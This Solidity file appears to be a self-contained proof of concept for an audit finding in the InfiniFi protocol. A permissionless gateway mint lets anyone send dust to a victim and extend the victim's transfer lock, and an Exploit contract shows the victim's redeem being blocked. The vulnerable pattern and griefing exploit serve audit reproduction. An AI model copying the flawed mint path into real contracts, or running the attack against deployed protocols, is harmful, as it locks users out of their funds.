// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  InfiniFi — minting 1 wei of iUSD to a victim blocks their redeem
    (Spearbit / R0bert, finding #55049, March 2025)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Gateway.mint(to, amount) is permissionless. It pulls `amount` of USDC and
    mints that many iUSD to `to`, then calls restrictActionUntil(to, now+1).
    The receipt token's _update rejects a transfer from a restricted address.
    Redeem transfers the user's iUSD, so a 1 wei mint to the victim makes their
    redeem of a 1000 iUSD position revert in the same block. No warp.

    The iUSD is backed by the USDC paid (collateral ratio stays 1e18). The harm
    is the other user's redeem, not an unbacked issuance. ReceiptToken.mint is
    only the minter role; a direct call from anyone else reverts. mintSelf does
    not restrict the victim, and the victim can redeem. */

contract MockUSDC {
    string public constant name = "USD Coin";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ReceiptToken {
    string public constant name = "InfiniFi USD";
    string public constant symbol = "iUSD";
    uint8 public constant decimals = 18;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public restrictedUntil;
    uint256 public totalSupply;

    function setMinter(address who) external {
        require(minter == address(0), "set");
        minter = who;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function restrictActionUntil(address who, uint256 until) external {
        require(msg.sender == minter, "minter");
        if (until > restrictedUntil[who]) {
            restrictedUntil[who] = until;
        }
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amount;
        }
        _update(from, to, amount);
        return true;
    }

    function _checkActionRestriction(address who) internal view {
        require(block.timestamp >= restrictedUntil[who], "restricted");
    }

    /// @dev Verbatim shape from the report. Transfers check the sender. Mints and burns do not.
    function _update(address _from, address _to, uint256 _value) internal {
        if (_from != address(0) && _to != address(0)) {
            // check action restrictions if the transfer is not a burn nor a mint
            _checkActionRestriction(_from);
        }
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
    }
}

contract InfiniFiGateway {
    MockUSDC public usdc;
    ReceiptToken public iusd;
    uint256 public collateral;
    uint256 public constant RESTRICTION_DURATION = 1;

    constructor(MockUSDC usdc_, ReceiptToken iusd_) {
        usdc = usdc_;
        iusd = iusd_;
    }

    function collateralRatio() public view returns (uint256) {
        uint256 supply = iusd.totalSupply();
        if (supply == 0) return 1e18;
        return collateral * 1e18 / supply;
    }

    /// @dev Seed an already-unrestricted position. The 1-second lock from the
    /// original mint has elapsed; this playground tx has a single timestamp.
    function deposit(address to, uint256 amount) external {
        usdc.transferFrom(msg.sender, address(this), amount);
        collateral += amount;
        iusd.mint(to, amount);
    }

    function mint(address to, uint256 amount) external returns (uint256) {
        return _mintTo(to, amount);
    }

    /// @dev Control path. The caller can only restrict themselves.
    function mintSelf(uint256 amount) external returns (uint256) {
        return _mintTo(msg.sender, amount);
    }

    function _mintTo(address to, uint256 amount) internal returns (uint256) {
        usdc.transferFrom(msg.sender, address(this), amount);
        collateral += amount;
        iusd.mint(to, amount);
        // @> VULN: any caller mints iUSD to `to` and extends that address's transfer lock
        iusd.restrictActionUntil(to, block.timestamp + RESTRICTION_DURATION);
        return amount;
    }

    function redeem(uint256 amount) external returns (uint256) {
        iusd.transferFrom(msg.sender, address(this), amount);
        collateral -= amount;
        usdc.transfer(msg.sender, amount);
        return amount;
    }
}

contract Victim {
    function deposit(MockUSDC usdc, InfiniFiGateway gateway, uint256 amount) external {
        usdc.approve(address(gateway), amount);
        gateway.deposit(address(this), amount);
        ReceiptToken(address(gateway.iusd())).approve(address(gateway), type(uint256).max);
    }

    function tryRedeem(InfiniFiGateway gateway, uint256 amount) external returns (bool reverted) {
        try gateway.redeem(amount) returns (uint256) {
            reverted = false;
        } catch {
            reverted = true;
        }
    }

    function redeem(InfiniFiGateway gateway, uint256 amount) external returns (uint256) {
        return gateway.redeem(amount);
    }
}

contract Exploit {
    uint256 public constant VICTIM_DEPOSIT = 1000 ether;
    uint256 public constant DUST = 1;

    MockUSDC public usdc; // CREATE nonce 1
    InfiniFiGateway public gateway; // CREATE nonce 2
    ReceiptToken public iusd; // CREATE nonce 3
    Victim public victim; // CREATE nonce 4

    uint256 public ratioBefore;
    uint256 public ratioAfter;
    uint256 public victimIusd;
    uint256 public restrictedUntil;
    bool public redeemReverted;
    uint256 public victimUsdcAfter;
    uint256 public lockedUsdc;

    constructor() {
        usdc = new MockUSDC();
        iusd = new ReceiptToken();
        gateway = new InfiniFiGateway(usdc, iusd);
        iusd.setMinter(address(gateway));
        victim = new Victim();
    }

    function run() external {
        usdc.mint(address(victim), VICTIM_DEPOSIT);
        victim.deposit(usdc, gateway, VICTIM_DEPOSIT);
        ratioBefore = gateway.collateralRatio();
        usdc.mint(address(this), DUST);
        usdc.approve(address(gateway), DUST);
        gateway.mint(address(victim), DUST);
        victimIusd = iusd.balanceOf(address(victim));
        restrictedUntil = iusd.restrictedUntil(address(victim));
        ratioAfter = gateway.collateralRatio();
        redeemReverted = victim.tryRedeem(gateway, VICTIM_DEPOSIT);
        victimUsdcAfter = usdc.balanceOf(address(victim));
        lockedUsdc = usdc.balanceOf(address(gateway));
        require(ratioBefore == 1e18, "ratio before");
        require(victimIusd == VICTIM_DEPOSIT + DUST, "dust iUSD");
        require(restrictedUntil == block.timestamp + 1, "lock");
        require(ratioAfter == 1e18, "ratio after");
        require(redeemReverted, "redeem did not break");
        require(victimUsdcAfter == 0, "victim was paid");
        require(lockedUsdc == VICTIM_DEPOSIT + DUST, "usdc not locked");
        require(iusd.minter() == address(gateway), "minter");
    }
}
